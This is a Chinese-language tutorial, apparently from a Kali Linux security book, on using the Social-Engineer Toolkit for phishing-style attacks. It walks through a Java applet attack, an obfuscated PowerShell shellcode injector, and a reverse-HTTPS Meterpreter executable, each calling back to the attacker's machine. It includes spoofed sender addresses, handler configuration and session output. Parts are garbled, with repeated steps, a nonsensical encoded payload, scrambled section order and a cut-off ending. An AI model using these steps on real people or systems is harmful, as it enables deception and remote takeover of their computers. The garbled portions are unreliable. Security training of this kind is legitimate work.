
上面的消息显然是一个愚蠢的玩笑。但尽管如此，如果使用更具说服力的信息并包含指向测试网站的链接，就可以用来测试员工检测、抵抗和报告钓鱼尝试的能力。有很多显而易见的钓鱼尝试，但我必须告诉你，我见过一些看起来非常可信的。这就是为什么训练员工警惕恶意邮件是一个好主意。

## SET 的 Java Applet 攻击向量

到目前，我们已经看到了如何发送可能将某重定向到虚假网站的假邮件。但如果我们能创建一个提供陷阱脚本的虚假网站呢？如果用户允许脚本运行，就会与用户创建一个远程 shell。使用 SET 我们可以做到！Java Petit Attack 尝试利用大量使用 Java 的公司。Java 攻击向量就像防病毒软件一样，是一场猫鼠游戏，本周有效的下周可能就失效了。基本上，尽管 Java Applet 攻击最近已针对当前版本的 SET 应用更新，你仍然需要欺骗用户运行 applet。取决于用户的安全设置，攻击可能仍然被拦截。

最后，SET 的当前版本似乎存在一个问题，即运行时它不会启动监听器并将你带回主菜单，但我确定它会在更新中被修复。尽管如此，下方的某些截图是书中以前版本的旧截图。

我们将使用 SET 创建一个虚假网站，该网站将提供带有陷阱的 Java app。如果用户允许 app 运行，我们就获得该系统的远程会话。本部分我们将使用 Windows 7 虚拟机作为“目标”。如果你的 Windows 系统尚未安装 Java，也需要安装它。从主菜单开始：

- 选择数字 1，“Social Engineering Attacks”（社会工程学攻击）。
- 接下来选择 2，“Website Attacks”（网站攻击）。

在继续之前，请注意其他选项。这里有几种备选的攻击方法：

- `Metasploit Browser Exploit` - 使用 Metasploit 浏览器攻击客户端系统。
- `Credential Harvester` - 克隆现有网站（如 Facebook）并存储输入其中的任何凭据。
- `Tabnabbing` - 如果客户端打开了许多浏览器，则切换标签页到某个页面。
- `Web Jack` - 使用 iframe 替换使其看起来合法。
- `Multi-Attack` - 结合上述几项。
- `HTA Attack` - 使用 HTA 文件和 PowerShell 注入的攻击。

现在，使用 Java Applet 攻击。我强烈建议你查看其他选项，看看哪种最好，以及它们在不同情况下可能如何。

- 3. 选择 1，“Java Applet Method”（Java Applet 方法）。这将创建一个带有 Java 网页。
- 4. 你的邮件地址：`Your email address:EvilHacker@EvilDomain.com`
- 5. 你的邮件地址：`EvilHacker@EvilDomain.com`
- 6. 你的邮件地址：`The FROM name the user will see:ITDepartment@SomeRandomDomain.com`
- 7. 在提示以 html 或 plain 发送消息时输入“P”。
- 8. Java Applet 尝试利用大量使用 Java 的公司。
- 9. Java 攻击向量，就像防病毒软件一样，是一场猫鼠游戏，本周有效的下周可能就失效了。基本上，尽管 Java Applet 攻击最近已针对当前版本的 SET 应用更新，你仍然需要欺骗用户运行 applet。取决于用户的安全设置，攻击可能仍然被拦截。

这就是受害者方面一个糟糕的错误，正如你所看到的，我们拥有了一个完整的远程会话。正如文章开头提到的，最新版本的 Java 将直接阻止此漏洞的运行。但如果用户没有升级 Java，或者 Java 的安全设置较弱，这仍然是一个可行的攻击方案。

## 社会工程工具包：PowerShell 攻击向量

基于 Java 的 PowerShell 攻击非常棒，但如果目标没有运行 Java，或者我们无法欺骗他们访问我们的 SET 页面怎么办？另一种社会工程尝试是欺骗用户运行我们发送给他们的文件。因此，让我们创建一个 PowerShell shellcode 文件并发送给目标。如果我们能欺骗目标运行 shellcode，或者由我们运行它，就能获得与机器的远程连接。

在本节中，我们将使用 SET 的 PowerShell 攻击向量创建一个 PowerShell 脚本，目标系统运行该脚本后将回连并为我们的 Kali 系统创建一个远程 shell。我们还将使用 SET 寻找查找这些入站连接。

1. 从 SET 主菜单中，选择 `Social-Engineering-Attacks`
2. 选择 `Powershell Attack Vector` 选项。

```
The PowerShell Attack Vector allows you to create PowerShell specific attacks. These attacks allow you use PowerShell which is available by default in all operating systems Windows Vista and above. PowerShell provides a fruitful landscape for deploying payloads and performing functions that do not triggered by preventative technologies.

1) PowerShell Alphanumeric Shellcode Injector

2) PowerShell Reverse Shell

3) PowerShell Bind Shell

4) PowerShell Dump SAM Database

99) Return to Main Menu
```

```
set:powershell-|
```

3. 接下来选择数字 1，“Powershell Alphanumeric Shellcode Injector”。

4. 现在只需 Kali 系统的 IP 地址。

5. 接下来，你想让 Windows 机器使用哪个端口。使用默认端口 443 就足够了。

6. 最后 SET 询问你是否想创建一个监听器服务，这样当受害者运行代码时，SET 将准备就绪以接受远程连接。在提示处输入 "yes"。

```
Enter the IP or DNS name for the receive: 102.168.1.39

[*] Prepping the payload for the receive [443]

[*] Preparing the payload for server and injecting alphanumeric shellcode...\n[*] Generating x86-base powershell injection...

[*] Calculating... done.

No encoder or barcher found, outputting raw payload

Final size: 1622 bytes

[*] Finishing powershell injection bypass.

[*] Encoded to bypass execution policy...\n[*] If you want the powershell code now and attack, they are exported to /root/reports/powershell/

[*] Do you want to start the listener now [yes/no]: : yes
```

SET 创建漏洞代码，如果你选择启动监听器，它将在 Metasploit 中启动监听器服务并等待连接：

```
resource (/root/set/reports/powershell.rc) for ERB directives.

resource (/root/set/reports/powershell.rc) use multi/handler

resource (/root/set/reports/powershell.rc) set payload windows/meterpreter/reverse_http

resource (/root/set/reports/powershell.rc) set LPORT 443

LPORT = 443

resource (/root/set/reports/powershell.rc) set LHOST 0.0.0.0

LHOST = 0.0.0.0

resource (/root/set/reports/powershell.rc) set ExitOnSession false

ExitSession = false

resource (/root/set/reports/powershell.rc) exploit -j

[*] Exploit running as background job 0.
```

现在我们只需要将漏洞代码发送给受害者系统。SET 创建漏洞代码并将其放在 `/root/set/reports/powershell/`。

7. 离开 SET 窗口并打开另一个终端。
8. 导航到 `/root/set/reports/powershell/` 目录，你将在一个文本文件中看到 PowerShell 注入代码，在我们的示例中该文件名为 `x86_powershell_injection.txt`。

你可以调用 `cat` 文件来显示其内容：

```
root@kali://root/set/reports/powershell# cat x86_powershell_injection.txt

powershell -w -c "$iex=yv; $iex=50 (g, $y).Value.ToString()($gi)

$string.ToString()($y).Value.ToString()*JAGWIAIAWABAAACAJWAKAEAAIAIAAAAAIAEAWGABIAAG0ACAAQIAAAQIAAAWLBAGAGWIAWAYACAZAgWAAAgWAAICABIAEAAABIAAG0ACAAQIAAAQIAAAWLBAGAGWIAWAYACAZAgWAAAgWAAICABIAEAAABIAAG0ACAAQIAAAQIAAAWLBAGAGWIAWAYACAZAgWAAAgWAAICABIAEAAABIAAG0ACAAQIAAAQIAAAWLBAGAGWIAWAYACAZAgWAAAgWAAICABIAEAAABIAAG0ACAAQIAAAQIAAAWLBAGAGWIAWAYACAZAgWAAAgWAAICABIAEAAABIAAG0ACAAQIAAAQIAAAWLBAGAGWIAWAYACAZAgWAAAgWAAICABIAEAAABIAAG0ACAAQIAAAQIAAAWLBAGAGWIAWAYACAZAgWAAAgWAAICABIAEAAABIAAG0ACAAQIAAAQIAAAWLBAGAGWIAWAYACAZAgWAAAgWAAICABIAEAAABIAAG0ACAAQIAAAQIAAAWLBAGAGWIAWAYACAZAgWAAAgWAAICABIAEAAABIAAG0ACAAIAAA
```

如果 Windows 系统运行该代码，将打开一个到我们机器的远程会话。

9. 在此示例中，我将代码复制并粘贴到 Windows 7 提示符中：

```
C:\Windows\system32\cmd.exe

Microsoft Windows [Version 6.1.7600] All rights reserved.

Copyright (C) 2009 Microsoft Corporation.

C:\Users\Dan>powershell -w -c "$iex=yv; $iex=50 (g, $y).Value.ToString()($gi)

$string.ToString()($y).Value.ToString()*JAGWIAIAWABAAACAJWAKAEAAIAIAAAAAIAEAWGABIAAG0ACAAQIAAAQIAAAWLBAGAGWIAWAYACAZAgWAAAgWAAICABIAEAAABIAAG0ACAAQIAAAQIAAAWLBAGAGWIAWAYACAZAgWAAAgWAAICABIAEAAABIAAG0ACAAQIAAAQIAAAWLBAGAGWIAWAYACAZAgWAAAgWAAICABIAEAAABIAAG0ACAAQIAAAQIAAAWLBAGAGWIAWAYACAZAgWAAAgWAAICABIAEAAABIAAG0ACAAQIAAAQIAAAWLBAGAGWIAWAYACAZAgWAAAgWAAICABIAEAAABIAAG0ACAAQIAAAQIAAAWLBAGAGWIAWAYACAZAgWAAAgWAAICABIAEAAABIAAG0ACAAQIAAAQIAAAWLBAGAGWIAWAYACAZAgWAAAgWAAICABIAEAAABIAAG0ACAAIAAA
```

## Payload 和监听器

大多数用户不会复制并粘贴文本来创建提示符然后执行它，这种方法适用于可能获得远程提示符访问并想要使用完整 Meterpreter shell 的渗透测试人员。你应该使用 SET 的 "Payloads and Listeners" 创建一个 .exe 格式的 shell。由于我们已经涵盖了类似的话题，我们将只需快速看一下这一点：

从主菜单选择 "Create a Payload and Listener"
选择一个 payload 选项，我选择了 "Windows Meterpreter Reverse HTTPS"
在提示时设置你的 Kali IP 地址和端口

当你想启动监听器时，输入 "yes"。

7. `Windows Meterpreter Reverse HTTPS`
8. `Windows Meterpreter Reverse DNS`
9. `Download/Run Your Own Executable`
通过 HTTP 隧道通信
使用主机名代替 IP
下载并运行执行文件

```
set:payload>

set:payload> IP address for the payload listener (LHOST):192.168.1.39

set:payload> Enter the PORT for the reverse listener:4545

[*] Generating the payload.. please patient.

[*] Payload has been exported to the default SET directory located under: /root

set:payload> Do you want to start the payload and listener now? (yes/no):yes

[*] Launching metasconsole, this could take a few load. Be patient...
```

就是，文件将被保存为 `/root/set/payload.exe`。复制此文件并在你的 Windows 7 系统上运行，你将获得一个 shell。

## SET 的其他攻击选项

花些时间研究 SET 并检查它为攻击目标系统提供的众多选项。你可以使用 SET 创建恶意的 CD/DVD 和 USB 介质（用于创建陷阱介质并将其留在公司停车场等等）、一系列基于 Arduino 的攻击、Microsoft SQL 暴力破解、无线接入点攻击、批量邮件发送、QR 码攻击以及我们未涵盖的一系列网站社会工程攻击。

Fast Track 菜单下的 SCC 攻击对于任何使用 PXE 启动和公司镜像的团体特别值得关注。有关 SCC 攻击的完整概述，请参：

> http://www.trustedsec.com/files/Ownership_One_Rule_All_v2.pdf

你可以在 SET 配置文件中设置许多选项来修改 SET 的运行方式。该文件位于 `/etc/settoolkit/set.config`。社会工程工具包确实是一个强大且功能丰富的程序。尽管其他工具开始提供类似的功能，但它仍然是任何企业安全测试团队的价值工具。

一旦你进入，Kali 系统上将创建一个远程会话：

```
* Started HTTPS handler on 0.0.0:443

* 0.0.0:443 handling request from 192.168.1.93: (UUID: f7dw7) Staging

* Meterpreter session opened [192.168.1.93 -> 192.168.1.93:50495] on 2018-07-11

msf exploit(multi/handler) > sessions -i 1

* Starting interaction with 1...

meterpreter shell

Process 2032 created.

Channel 1 created.

Microsoft Windows [Version 6.1.7600]

Copyright (C) 2009 Microsoft Corporation. All rights reserved.

C:\Users\Dan>
```

在之前的教程中，一旦打开会话 (`sessions -i`)，我们可以使用任何 Meterpreter 或 Linux 命令，或者输入 "shell" 获取远程提示符。

## 结论

如你所示，社交工程工具包（Social Engineering Toolkit）是一个非常实用的工具。如今几乎每个 Windows 机器都可以使用 PowerShell，而且某些杀毒程序仍然无法检测这类攻击，这使得它们非常有用。最新的操作系统在处理这类问题时仍然存在困难，因为它们对 PowerShell 仍然相当信任。

如下所示：
```
